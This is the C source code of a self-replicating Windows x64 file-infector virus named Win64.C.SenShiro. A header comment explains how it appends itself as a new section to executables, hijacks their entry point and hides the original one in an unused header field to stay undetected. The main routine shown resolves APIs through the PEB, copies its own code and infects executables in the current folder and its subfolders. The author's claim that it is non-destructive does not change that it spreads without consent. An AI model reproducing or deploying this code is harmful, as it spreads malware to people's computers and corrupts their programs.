/******************************************************************************

This is Win64.C.SenShiro by SenVxReiz
Coded June 2011

Special thanks go to Lord Julus who gave me the idea for this program. 
Win64.C.SenShiro:
- is a last section appender for PE32+ (it is actually the upgraded version of Win32.C.Sen1)
- is fully written in C language.
- is non destructive for host, does not alter victim code, and gets back to host after having run its own code.
- infects all drives and folders on the local machine.
- has no destructive payload, only capable of replicating itself.
- has been tested on Win7 x64.

The only difficulty encountered during the coding was to make SenShiro so independant that it can run on any host. 
And that whatever the dlls loaded, the functions imported by host and of course the data section of the victim.

To achieve this goal, SenShiro uses the well known technique of accessing the Process Environment Block to 
retrieve the base address of kernel32.dll. From there, SenShiro dumps the export table of kernel32 to get the 
necessary functions. Notice the option /NODEFAULTLIB:ON in the MAKEFILE which makes it possible to remove 
the .idata section.

On first generation SenShiro has 3 sections, the code, and the SEH handler sections .rdata and .pdata. SenShiro 
does not care during infection about these two last sections, so that's why the code does not use SEH functions.

Once an exe is found we put a new section at the end and copy the vir code inside. 
The Entry point of host is updated to jump to the vir at run time. Of course to remain undetected we have to 
jump back to host once the vir has done its job. Again there must be a lot of different ways to do this, but if 
we can't alter the host code then we have to hard code the original EP somewhere in the header. I chose the field 
Win32VersionValue because it is useless for the OS. That does the trick. 

SenVXReiz
*******************************************************************************/

#include "SenShiro.h"


int APIENTRY WinMain(HINSTANCE hProg, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){


int length_string, counter, counter2, ind_s, index;
LARGE_INTEGER VirFileSize;

BOOL bCurrentSectionFound = FALSE, bResult, bSecondGen = FALSE;

WORD CurrentP_NbOfSections, NbSectionsInVir;

DWORD CurrentAdrEP, NbOfBytes, VirEP, OldEP, SizeRawVir, OffsetVirEP, RVATextSection, RawStartAddress;

QWORD ActualDataAddress, AddrOfLoadLibrary, AddrofGetProcAddress, 
	AddrofGetSystemDirectory, AddrOfMessageBox, Addroflstrcat, AddrOfExit, AdrOfWsprintf, Addrofmemset, 
	AddrofShellExecute, AddrofFreeLibrary, AddrofFindFirstFile, Addroflstrcpy, AddrofFindNextFile, 
	AddrofCreateFile, AddrofReadFile, AddrofVirtualAlloc, AddrofGetFileSize, AddrofSetFilePointer, 
	AddrofWriteFile, AddrofSetEOF, AddrofVirtualFree, AddrofCloseHandle, AddrofGetCommandLine, Addroflstrlen, 
	AddrofCopyFile, AddrofGetLogicalDriveStrings, AddrofGetDriveType, AddrofGetWinDir;

BYTE *vFileInMemory, *payload, *VirDataSection;

FARPROC lpHostEntry;

PMYPEB pMYPEB;
PPEB_LDR_DATA pPEBLdrData;
PLDR_MODULE pLdrModule;
API_LOADED apis;
STR_CHARS str_chars;

PIMAGE_DOS_HEADER CurrentDOSStub, VirDOSStub;
PIMAGE_NT_HEADERS64 CurrentPEheader, VirPEheader;
PIMAGE_OPTIONAL_HEADER64 CurrentOptPEheader;

PIMAGE_FILE_HEADER CurrentProcess_FSpHeader;
PIMAGE_SECTION_HEADER ImgCurrentSectionHeader, ImgCurrentSectionHeader2;

ULONGLONG CurrentBaseAddress, BaseAddressKernel;
char buffer[MAX_PATH], buffer2[MAX_PATH];
LPTSTR lpbuf = buffer;
LPTSTR CurrentProcessString = buffer2;

HANDLE hVir;
HMODULE hMod_Function, hMod_msvcrt, hModShell;

/*
************************************************************************************
Local strings*/

char stringLL[] = "LoadLibraryA";
char stringGPA[] = "GetProcAddress";
char stringGSDA[] = "GetSystemDirectoryA";
char string_cat[] = "lstrcat";
char stringFL[] = "FreeLibrary";
char string_user32[] = "\\user32.dll";
char string_MsB[] = "MessageBoxA";
char string_msvcrt[] = "\\msvcrt.dll";
char string_exit[] = "_exit";
char string_WsP[] = "wsprintfA";
char string_FFF[] = "FindFirstFileA";
char string_cpy[] = "lstrcpyA";
char string_FNF[] = "FindNextFileA";
char string_CFA[] = "CreateFileA";
char string_RFile[] = "ReadFile";
char string_VAlloc[] = "VirtualAlloc";
char string_GSize[] = "GetFileSizeEx";
char string_SFileP[] = "SetFilePointer";
char string_WFile[] = "WriteFile";
char string_SEOF[] = "SetEndOfFile";
char string_VFree[] = "VirtualFree";
char string_CloseH[] = "CloseHandle";
char string_GCMDL[] = "GetCommandLineA";
char string_len[] = "lstrlen";
char string_memset[] = "memset";
char string_CpyF[] = "CopyFileA";
char string_GDriveStr[] = "GetLogicalDriveStringsA";
char string_GDriveT[] = "GetDriveTypeA";
char string_shell32[] = "\\shell32.dll";
char string_shexec[] = "ShellExecuteA";
char string_dotnet[] = "mscoree.dll";
char string_GWDir[] = "GetWindowsDirectoryA";
char string_EXE[] = "*.exe";
char string_fake[] = ".fake";
char star[] = "*";
char dot[] = ".";
char dotdot[] = "..";
char bslash[] = "\\";
char string_signature[] = "This.Is.Win64.SenShiro.By.SenVXReiz";

str_chars.BSLASH = bslash;
str_chars.STRING_EXE = string_EXE;
str_chars.STAR = star;
str_chars.DOT = dot;
str_chars.DOTDOT = dotdot;
str_chars.DOTNET = string_dotnet;
str_chars.SIGNATURE = string_signature;
str_chars.FAKE = string_fake;

/*
***************************************************************************
Start of code*/

	//Get GS:0x60
	pMYPEB = (MYPEB*)__readgsqword(0x60);
 
	pPEBLdrData = pMYPEB->LoaderData;
 
	pLdrModule = (PLDR_MODULE) pPEBLdrData->InLoadOrderModuleList.Flink; //current executable

	CurrentBaseAddress = (ULONGLONG)pLdrModule->BaseAddress;

	pLdrModule = (PLDR_MODULE) pLdrModule->InLoadOrderModuleList.Flink;  //ntdll.dll

	pLdrModule = (PLDR_MODULE) pLdrModule->InLoadOrderModuleList.Flink;  //kernel	
	BaseAddressKernel = (QWORD)pLdrModule->BaseAddress;


	//Retrieve VA of the beginning of current process and get rid of .data section
	CurrentDOSStub = (PIMAGE_DOS_HEADER)CurrentBaseAddress;
	CurrentPEheader = (PIMAGE_NT_HEADERS64)((QWORD)CurrentDOSStub + CurrentDOSStub->e_lfanew);
	CurrentOptPEheader = (PIMAGE_OPTIONAL_HEADER64)&CurrentPEheader->OptionalHeader;
	CurrentAdrEP = CurrentOptPEheader->AddressOfEntryPoint;
	ActualDataAddress = CurrentOptPEheader->ImageBase;
	CurrentProcess_FSpHeader = (PIMAGE_FILE_HEADER)&CurrentPEheader->FileHeader;
	CurrentP_NbOfSections = CurrentProcess_FSpHeader->NumberOfSections;

	//We have to find the section containing the entry point
	for (ind_s = 0; ind_s < CurrentP_NbOfSections - 1; ind_s++){
		ImgCurrentSectionHeader = (PIMAGE_SECTION_HEADER)((QWORD)CurrentPEheader + sizeof(IMAGE_NT_HEADERS64)
		+ ind_s*sizeof(IMAGE_SECTION_HEADER));
		ImgCurrentSectionHeader2 = (PIMAGE_SECTION_HEADER)((QWORD)CurrentPEheader + sizeof(IMAGE_NT_HEADERS64)
		+ (ind_s+1)*sizeof(IMAGE_SECTION_HEADER));

		if (ImgCurrentSectionHeader2->VirtualAddress > CurrentAdrEP && ImgCurrentSectionHeader->VirtualAddress <= CurrentAdrEP){
			bCurrentSectionFound = TRUE;
			break;
		}
	}
	if (bCurrentSectionFound){
		RVATextSection = ImgCurrentSectionHeader->VirtualAddress;
		SizeRawVir = ImgCurrentSectionHeader->SizeOfRawData;
		RawStartAddress = ImgCurrentSectionHeader->PointerToRawData;
	}
	
	else {
		//We assume it's located in the last section
		ImgCurrentSectionHeader = (PIMAGE_SECTION_HEADER)((QWORD)CurrentPEheader + sizeof(IMAGE_NT_HEADERS64)
		+(CurrentP_NbOfSections-1)*sizeof(IMAGE_SECTION_HEADER));
		RVATextSection = ImgCurrentSectionHeader->VirtualAddress;
		SizeRawVir = ImgCurrentSectionHeader->SizeOfRawData;
		RawStartAddress = ImgCurrentSectionHeader->PointerToRawData;
		bSecondGen = TRUE;
	}

	//Kernel part to retrieve the function addresses and get rid of .idata section

	AddrOfLoadLibrary = LookUpKernel(BaseAddressKernel, stringLL);
	AddrofGetProcAddress = LookUpKernel(BaseAddressKernel, stringGPA);
	AddrofGetSystemDirectory = LookUpKernel(BaseAddressKernel, stringGSDA);
	Addroflstrcat = LookUpKernel(BaseAddressKernel, string_cat);
	AddrofFreeLibrary = LookUpKernel(BaseAddressKernel, stringFL);
	AddrofFindFirstFile = LookUpKernel(BaseAddressKernel, string_FFF);
	Addroflstrcpy = LookUpKernel(BaseAddressKernel, string_cpy);
	AddrofFindNextFile = LookUpKernel(BaseAddressKernel, string_FNF);
	AddrofCreateFile = LookUpKernel(BaseAddressKernel, string_CFA);
	AddrofReadFile = LookUpKernel(BaseAddressKernel, string_RFile);
	AddrofVirtualAlloc = LookUpKernel(BaseAddressKernel, string_VAlloc);
	AddrofGetFileSize = LookUpKernel(BaseAddressKernel, string_GSize);
	AddrofSetFilePointer = LookUpKernel(BaseAddressKernel, string_SFileP);
	AddrofWriteFile = LookUpKernel(BaseAddressKernel, string_WFile);
	AddrofSetEOF = LookUpKernel(BaseAddressKernel, string_SEOF);
	AddrofVirtualFree = LookUpKernel(BaseAddressKernel, string_VFree);
	AddrofCloseHandle = LookUpKernel(BaseAddressKernel, string_CloseH);
	AddrofGetCommandLine = LookUpKernel(BaseAddressKernel, string_GCMDL);
	Addroflstrlen = LookUpKernel(BaseAddressKernel, string_len);
	AddrofCopyFile = LookUpKernel(BaseAddressKernel, string_CpyF);
	AddrofGetLogicalDriveStrings = LookUpKernel(BaseAddressKernel, string_GDriveStr);
	AddrofGetDriveType = LookUpKernel(BaseAddressKernel, string_GDriveT);
	AddrofGetWinDir = LookUpKernel(BaseAddressKernel, string_GWDir);

	apis.fnLoadLibrary = (ptLoadLibraryA)AddrOfLoadLibrary;
	apis.fnGetProcAddress = (ptGetProcAddress)AddrofGetProcAddress;
	apis.fnGetSystemDirectory = (ptGetSystemDirectory)AddrofGetSystemDirectory;
	apis.fnlstrcat = (ptlstrcat)Addroflstrcat;
	apis.fnFreeLibrary = (ptFreeLibrary)AddrofFreeLibrary;
	apis.fnFindFirstFile = (ptFindFirstFile)AddrofFindFirstFile;
	apis.fnlstrcpy = (ptlstrcpy)Addroflstrcpy;
	apis.fnFindNextFile = (ptFindNextFile)AddrofFindNextFile;
	apis.fnCreateFile = (ptCreateFile)AddrofCreateFile;
	apis.fnReadFile = (ptReadFile)AddrofReadFile;
	apis.fnVirtualAlloc = (ptVirtualAlloc)AddrofVirtualAlloc;
	apis.fnGetFileSizeEx = (ptGetFileSizeEx)AddrofGetFileSize;
	apis.fnSetEndOfFile = (ptSetEndOfFile)AddrofSetEOF;
	apis.fnSetFilePointer = (ptSetFilePointer)AddrofSetFilePointer;
	apis.fnWriteFile = (ptWriteFile)AddrofWriteFile;
	apis.fnVirtualFree = (ptVirtualFree)AddrofVirtualFree;
	apis.fnCloseHandle = (ptCloseHandle)AddrofCloseHandle;
	apis.fnGetCommandLine = (ptGetCommandLine)AddrofGetCommandLine;
	apis.fnlstrlen = (ptlstrlen)Addroflstrlen;
	apis.fnCopyFile = (ptCopyFile)AddrofCopyFile;
	apis.fnGetLogicalDriveStrings = (ptGetLogicalDriveStrings)AddrofGetLogicalDriveStrings;
	apis.fnGetDriveType = (ptGetDriveType)AddrofGetDriveType;
	apis.fnGetWindowsDirectoryA = (ptGetWindowsDirectoryA)AddrofGetWinDir;

	//Find the system directory where are located the dlls
	ZeroMemory(lpbuf, sizeof(lpbuf));
	apis.fnGetSystemDirectory(lpbuf, MAX_PATH);

	//Load user32.dll and retrieve the messagebox and wsprintf functions
	apis.fnlstrcat(lpbuf, string_user32);
	hMod_Function = apis.fnLoadLibrary(lpbuf);
	AddrOfMessageBox = apis.fnGetProcAddress(hMod_Function, string_MsB);
	apis.fnMessageBox = (ptMessageBox)AddrOfMessageBox;
	AdrOfWsprintf = apis.fnGetProcAddress(hMod_Function, string_WsP);
	apis.fnwsprintf = (ptwsprintf)AdrOfWsprintf;

	//apis.fnMessageBox(NULL, "OK", "OK", MB_OK);

	//Same method to retrieve memset function from msvcrt.dll
	ZeroMemory(lpbuf, sizeof(lpbuf));
	apis.fnGetSystemDirectory(lpbuf, MAX_PATH);
	apis.fnlstrcat(lpbuf, string_msvcrt);
	hMod_msvcrt = apis.fnLoadLibrary(lpbuf);
	AddrOfExit = apis.fnGetProcAddress(hMod_msvcrt, string_exit);
	apis.fnexit = (ptexit)AddrOfExit;
	Addrofmemset = apis.fnGetProcAddress(hMod_msvcrt, string_memset);
	apis.fnmemset = (ptmemset)Addrofmemset;

	//Get ShellExecute function
	ZeroMemory(lpbuf, sizeof(lpbuf));
	apis.fnGetSystemDirectory(lpbuf, MAX_PATH);
	apis.fnlstrcat(lpbuf, string_shell32);
	hModShell = apis.fnLoadLibrary(lpbuf);
	AddrofShellExecute = apis.fnGetProcAddress(hModShell, string_shexec);
	apis.fnShellExecute = (ptShellExecute)AddrofShellExecute;

	//Retrieve the current process name from the commandline
	apis.fnmemset(lpbuf, 0, MAX_PATH);
	lpbuf = apis.fnGetCommandLine();
	length_string = apis.fnlstrlen(lpbuf);

	apis.fnmemset(CurrentProcessString, 0, MAX_PATH);
	
	for (counter = 0; counter < length_string; counter ++){
		if (lpbuf[length_string - counter] == '\\')break;
	}

	for (counter2 = 0; counter2 < counter -3; counter2 ++){
		CurrentProcessString[counter2] = lpbuf[length_string - counter + counter2 + 1];
	}

	apis.fnMessageBox(NULL, CurrentProcessString, CurrentProcessString, MB_OK);

	//Current process is known, now look for its size
	hVir = apis.fnCreateFile(CurrentProcessString, GENERIC_READ, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)0, OPEN_ALWAYS, 
		FILE_FLAG_SEQUENTIAL_SCAN, 0);
	if (hVir == INVALID_HANDLE_VALUE)apis.fnexit(0);

	apis.fnGetFileSizeEx(hVir, &VirFileSize);

	//Open it to copy the code section in memory
	vFileInMemory = apis.fnVirtualAlloc(NULL, (SIZE_T)VirFileSize.QuadPart, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if(vFileInMemory == NULL){apis.fnCloseHandle(hVir);apis.fnexit(0);}

	bResult = apis.fnReadFile(hVir, vFileInMemory, VirFileSize.LowPart, (LPDWORD)&NbOfBytes, NULL);
	if (!bResult)goto CleanAndQuit;

	VirDOSStub = (PIMAGE_DOS_HEADER)vFileInMemory;
	if(VirDOSStub->e_magic != IMAGE_DOS_SIGNATURE)goto CleanAndQuit;

	VirPEheader = (PIMAGE_NT_HEADERS)((DWORD)VirDOSStub + VirDOSStub->e_lfanew);
	if(VirPEheader->Signature != IMAGE_NT_SIGNATURE)goto CleanAndQuit;

	VirEP = VirPEheader->OptionalHeader.AddressOfEntryPoint;
	OldEP = VirPEheader->OptionalHeader.Win32VersionValue;

	//Get the OffsetEP i.e. the VA of the EP relative to the beginning of the section
	OffsetVirEP = VirEP - RVATextSection;

	payload = apis.fnVirtualAlloc(NULL, SizeRawVir, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (payload == NULL)goto CleanAndQuit;

	VirDataSection = (BYTE *)(vFileInMemory + RawStartAddress);

	for (index = 0; index < SizeRawVir; index++){
		payload[index] = VirDataSection[index];
	}
	
	//Inf. current dir and all subs
	InfectExeInDir(dot, payload, SizeRawVir, OffsetVirEP, str_chars, apis);

	InfectDirAndSubDir(dot, payload, SizeRawVir, OffsetVirEP, str_chars, apis);

	//Copy itself on all drives and execute
	//FindInfectAllDrives(CurrentProcessString, str_chars, apis);


CleanAndQuit:

	apis.fnMessageBox(NULL, string_signature, string_signature, MB_OK);

	if (bSecondGen){
		apis.fnMessageBox(NULL, string_signature, string_signature, MB_OK);
		lpHostEntry = (FARPROC)(OldEP + ActualDataAddress);
		lpHostEntry();
	}

	apis.fnCloseHandle(hVir);
	apis.fnFreeLibrary(hModShell);
	apis.fnFreeLibrary(hMod_msvcrt);
	apis.fnVirtualFree(vFileInMemory, sizeof(vFileInMemory), MEM_DECOMMIT);
	if (payload)apis.fnVirtualFree(payload, sizeof(payload), MEM_DECOMMIT);

	apis.fnexit(0);
}
